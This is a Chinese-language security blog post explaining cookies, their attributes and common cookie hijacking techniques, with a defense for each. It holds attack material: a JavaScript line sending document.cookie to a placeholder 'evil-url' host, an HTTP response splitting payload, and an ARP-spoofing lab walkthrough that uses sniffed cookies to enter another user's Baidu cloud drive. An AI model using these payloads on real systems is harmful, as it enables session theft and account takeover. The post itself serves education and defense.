title: Cookie与Cookie劫持
date: 2015-06-29 12:00:00
tags:
- Cookie
- Injection
- MITM
permalink: Cookie-and-Cookie-Injection
---

## 一、Cookie简介

### 1) 定义

Cookie（复数形态Cookies），中文名称为小型文本文件或小甜饼，指某些网站为了辨别用户身份而储存在用户本地终端（Client Side）上的数据（通常经过加密）。定义于RFC2109。是网景公司的前雇员Lou Montulli在1993年3月的发明。

### 2) 分类

Cookie总是保存在客户端中，按在客户端中的存储位置，可分为内存Cookie和硬盘Cookie。

内存Cookie由浏览器维护，保存在内存中，浏览器关闭后就消失了，其存在时间是短暂的。硬盘Cookie保存在硬盘里，有一个过期时间，除非用户手工清理或到了过期时间，硬盘Cookie不会被删除，其存在时间是长期的。所以，按存在时间，可分为非持久Cookie和持久Cookie。

## 二、Cookie的用途

通常Cookie有三种主要的用途。

### 1) Session管理

http协议本身是是无状态的，但是现代站点很多都需要维持登录态，也就是维持会话。最基本的维持会话的方式是Base Auth，但是这种方式，早期的网站用户名和密码在每次请求中会以明文的方式发送到客户端，很容易受到中间人攻击，存在很大的安全隐患。

所以现在大多数站点采用基于Cookie的Session管理方式：

当用户登录一个网站时，网站往往会请求用户输入用户名和密码，并且用户可以勾选“下次自动登录”。如果勾选了，那么下次访问同一网站时，用户会发现没输入用户名和密码就已经登录了。这正是因为前一次登录时，服务器发送了包含登录凭据（用户名加密码的某种加密形式）的Cookie到用户的硬盘上。第二次登录时，（如果该Cookie尚未到期）浏览器会发送该Cookie，服务器验证凭据，于是不必输入用户名和密码就让用户登录了。

### 2) 个性化

Cookie可以被用于记录一些信息，以便于在后续用户浏览页面时展示相关内容。典型的例子是购物站点的购物车功能。

在购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。

另一个个性化应用是广告定制。你访问过的网站会写入一些Cookies在你的浏览器里，这些Cookies会被一些广告公司用来售卖更精准的广告。比如你曾访问过一家汽车网站，那你浏览其他网站时可能就会看到一些汽车类的广告。

### 3) User Tracking

Cookie也可以用于追踪用户行为，例如是否访问过本站点，有过哪些操作等。

## 三、Cookie的基本特性

### 1) http request

浏览器向服务器发起的每个请求都会带上Cookie：
```js
GET /index.html HTTP/1.1
Host: www.example.org
Cookie: foo=value1;bar=value2
Accept: */*
```

### 2) http response

服务器给浏览器的返回可以设置Cookie：
```js
HTTP/1.1 200 OK
Content-type: text/html
Set-Cookie: name=value
Set-Cookie: name2=value2; Expires=Wed,09 June 2021 10:18:32 GMT

(content of page)
```

### 3) Cookie识别功能的说明

如果在一台计算机中安装多个浏览器，每个浏览器都会以独立的空间存放Cookie。因为Cookie中不但可以确认用户信息，还能包含计算机和浏览器的信息，所以一个用户使用不同的浏览器登录或者用不同的计算机登录，都会得到不同的Cookie信息，另一方面，对于在同一台计算机上使用同一浏览器的多用户群，Cookie不会区分他们的身份，除非他们使用不同的用户名登录。

## 四、Cookie有关的术语

### 1) Session Cookie

当Cookie没有设置超时时间，那么Cookie会在浏览器退出时销毁，这种Cookie是Session Cookie。

### 2) Persistent Cookie/Tracking Cookie

设置了超时时间的Cookie，会在指定时间销毁，Cookie的维持时间可以持续到浏览器退出之后，这种Cookie被持久化在浏览器中。

很多站点用Cookie跟踪用户的历史记录，例如广告类站点会使用Cookie记录浏览过哪些内容，搜索引擎会使用Cookie记录历史搜索记录，这时也可以称作Tracking Cookie，因为它被用于追踪用户行为。

### 3) Secure Cookie

服务器端设置Cookie的时候，可以指定Secure属性，这时Cookie只有通过https协议传输的时候才会带到网络请求中，不加密的http请求不会带有Secure Cookie。

设置secure cookie的方式举例：
```js
Set-Cookie: foo=bar; Path=/; Secure
```

### 4) HttpOnly Cookie

服务器端设置Cookie的时候，也可以指定一个HttpOnly属性。
```js
Set-Cookie: foo=bar; Path=/; HttpOnly
```

设置了这个属性的Cookie在javascript中无法获取到，只会在网络传输过程中带到服务器。

### 5) Third-Party Cookie

第三方Cookie的使用场景通常是iframe，例如`www.a.com`嵌入了一个`www.ad.com`的广告iframe，那么`www.ad.com`设置的cookie属于不属于`www.a.com`，被称作`第三方Cookie`。

### 6) Supercookie

Cookie会从属于一个域名，例如`www.a.com`，或者属于一个子域，例如`b.a.com`。但是如果Cookie被声明为属于`.com`会发生什么？这个Cookie会在任何`.com`域名生效。这有很大的安全性问题。这种Cookie被称作`Supercookie`。

浏览器做出了限制，不允许设置顶级域名Cookie(例如.com，.net)和pubic suffix cookie(例如.co.uk，.com.cn)。

现代主流浏览器都很好的处理了Supercookie问题，但是如果有些第三方浏览器使用的顶级域名和public suffix列表有问题，那么就可以针对Supercookie进行攻击。

### 7) Zombie Cookie/Evercookie

僵尸Cookie是指当用户通过浏览器的设置清除Cookie后可以自动重新创建的Cookie。原理是通过使用多重技术记录同样的内容(例如flash，silverlight)，当Cookie被删除时，从其他存储中恢复。

Evercookie是实现僵尸Cookie的主要技术手段。

## 五、Cookie劫持

包含了一些敏感消息：用户名，电脑名，使用的浏览器和曾经访问的网站。用户不希望这些内容泄漏出去，尤其是当其中还包含有私人信息的时候。

XSS（Cross site scripting，跨站脚本）是最基本的Cookie窃取方式。当攻击者通过XSS获取到用户Cookie后，攻击者将利用Cookie通过合法手段进入用户账号，浏览大部分用户资源。下图是Cookie劫持的示意图：

![Cookie劫持示意图][1]

另外，攻击者也能制造Cookie投毒。一般认为，Cookie在储存和传回服务器期间没有被修改过，而攻击者会在Cookie送回服务器之前对其进行修改，达到自己的目的。例如，在一个购物网站的Cookie中包含了顾客应付的款项，攻击者将该值改小，达到少付款的目的。这就是Cookie投毒。

### 1) 利用XSS漏洞获取Cookie

**攻击方法**

一旦站点中存在可利用的XSS漏洞，攻击者可直接利用注入的js脚本获取Cookie，进而通过异步请求把标识Session id的Cookie上报给攻击者。
```js
var img = document.createElement('img');
img.src = 'http://evil-url?c=' + encodeURIComponent(document.cookie);
document.getElementsByTagName('body')[0].appendChild(img);
```

**防御方法**

根据上面HttpOnly Cookie的介绍，一旦一个Cookie被设置为HttpOnly，js脚本就无法再获取到，而网络传输时依然会带上。也就是说依然可以依靠这个Cookie进行Session维持，但客户端js对其不可见。那么即使存在XSS漏洞也无法简单的利用其进行Session劫持攻击了。

上面说的防御方法无法利用XSS进行简单的攻击，但可以通过XSS结合其他漏洞获取Cookie。比如XSS结合phpinfo页面、HTTP Response Splitting。

### 2) XSS结合phpinfo页面

**攻击方法**

利用php开发应用会有一个phpinfo页面，这个页面会dump出请求信息，其中就包括Cookie信息。如下图所示的`_SERVER["HTTP_COOKIE"]`变量。

![phpinfo页面][2]

如果开发者没有关闭这个页面，就可以利用XSS漏洞向这个页面发起异步请求，获取到页面内容后parse出Cookie信息，然后上传给攻击者。

phpinfo是比较常见的一种dump请求的页面，但不限于此，为了调试方便，任何dump请求的页面都是可以被利用的漏洞。

**防御方法**

关闭所有phpinfo类dump request信息的页面。

### 3) HTTP Response Splitting

**攻击方法**

通常的XSS攻击都是把输入内容注入到response的content中，HTTP Response Splitting是一种针对header的注入。

例如，一个站点接受参数做302跳转：
```js
www.example.com/?r=http://baidu.com
```

request信息为：
```js
GET /example.com?r=http://baidu.com\r\n
HTTP/1.1\r\n
Host: example.com\r\n
\r\n
```

response为：
```js
HTTP/1.1 302 Found\r\n
Location: http://baidu.com\r\n
Content-Type: text/html\r\n
\r\n
```

这样页面就302跳转到了百度了。攻击者利用r参数可以注入header，r参数不是简单的url，而是包含\r\n的header信息：
```js
http://example.com/?r=%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a%3Chtml%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E%3Ch1%3EDefaced!%3C/h1%3E%3C/html%3E
```

这样，response就变成了：
```js
HTTP/1.1 302 Found\r\n
Location: \r\n
HTTP/1.1 200 OK\r\n
Content-Type: text/html\r\n
X-XSS-Protection: 0\r\n

<html><script>alert(document.cookie)</script><h1>Defaced!</h1></html>
Content-Type: text/html\r\n
\r\n
```

其中，X-XSS-Protection: 0 是关闭浏览器的XSS保护机制。

**防御方法**

针对header的内容做过滤，不能漏掉\r\n，特别是Location，host，referrer等。

### 4) 网络监听

Cookie不仅存在于上层应用中，也会在网络请求中传送，那么通过网络监听也可以抓取到Cookie信息。只要是未使用https加密的网站都可以抓包分析，其中就包含了标识Session的Cookie。

完成网络监听需要满足一定的条件，常见的方式有：中间人攻击、ARP欺骗、DNS投毒。

**攻击方法**

这里演示使用ARP欺骗与Wireshark和Cookie Injector脚本来劫持百度网盘的Cookie。

实验环境：
> 攻击者（Kali Linux）：10.10.10.128
攻击目标：10.10.10.129
默认网关：10.10.10.2
使用到的软件：arpspoof、Firefox（安装GreaseMonkey插件和Cookie Injector脚本）

在Kali Linux中开启内核IP转发：
```bash
root@kali:~# echo 1 > /proc/system/net/ipv4/ip_forward
```

通过traceroute命令追踪网关地址，可以看到网关地址为`10.10.10.2`：
```bash
root@kali:~# traceroute pan.baidu.com
traceroute to pan.baidu.com (202.108.23.29), 30 hops max, 60 byte packets
1   10.10.10.2 (10.10.10.2)  0.149 ms  0.098 ms  0.091 ms
```

通过ifconfig命令查看目前网络接口名称，可以看到本机网络接口名为`eth0`：
```bash
root@kali:~# ifconfig
eth0      Link encap:Ethernet  HWaddr 00:0c:29:e5:1d:2d
          inet addr:10.10.10.128  Bcast:10.10.10.255  Mask:255.255.255.0
```

使用arpspoof毒化arp，欺骗目标主机`10.10.10.129`，目的是通过Wireshark能抓取到它的Cookie信息。arpspoof用法为`arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host`:
```bash
root@kali:~# arpspoof -i eth0 -t 10.10.10.129 10.10.10.2
```

使用Wireshark监听数据，在过滤器中输入`http.cookie`，点击某个数据包，可以看到Cookie字段：

![Wireshark抓取Cookie信息][3]

在Cookie信息上点击右键复制它的值，在本机Firefox浏览器中打开 http://pan.baidu.com ，发现需要登录，使用Alt+C调出Cookie Injector窗口，把复制的Cookie值粘贴进去。

![Firefox中粘贴从Wireshark抓取的Cookie值][4]

刷新页面后，发现已经进入了`10.10.10.129`主机用户的百度网盘，如下图所示：

![利用Cookie登录他人百度网盘][5]

**防御方法**

网站使用Https协议。

防御网络监听通常有两种方式：信道加密和内容加密。网站开启Https连接属于信道加密，使用https协议的请求都被SSL加密，理论上不可破解，即便被网络监听也无法通过解密看到实际的内容。

但是，如果网站同时支持http和https，那么还是可以使用网络监听http请求获取Cookie。如果网站只支持Https，当用户直接输入example.com（大部分用户不会手动输入协议前缀），Web服务器通常的处理是返回301要求浏览器重定向到https://www.example.com。**因为这次301请求是http的，而且带了Cookie，因此又将Cookie明文暴露在了网络上。**

针对这个问题，有两个防御思路：
1.	把标识Session的Cookie设置成`Secure`。上面提到的Secure Cookie，只允许在https上加密传输，在http请求中不会存在，这样就不会暴露在未加密的网络上了。
2.	设置`Strict-Transport-Security header`，直接省略这个http请求！用户首次访问后，服务器设置了这个header以后，后面就会省略掉这次http 301请求。

## 六、参考文档
1.	https://zh.wikipedia.org/wiki/Cookie
2.	http://shaoshuai.me/tech/2014/08/16/cookie-theft-and-session-hijacking.html
3.	https://www.91ri.org/3767.html


  [1]: https://i.imgur.com/QmYM5Qx.jpg "Cookie劫持示意图"
  [2]: https://i.imgur.com/TZFCxjL.png "phpinfo页面"
  [3]: https://i.imgur.com/BNacXNA.png "Wireshark抓取Cookie信息"
  [4]: https://i.imgur.com/m6yKt1f.png "Firefox中粘贴从Wireshark抓取的Cookie值"
  [5]: https://i.imgur.com/efwJv5a.png "利用Cookie登录他人百度网盘"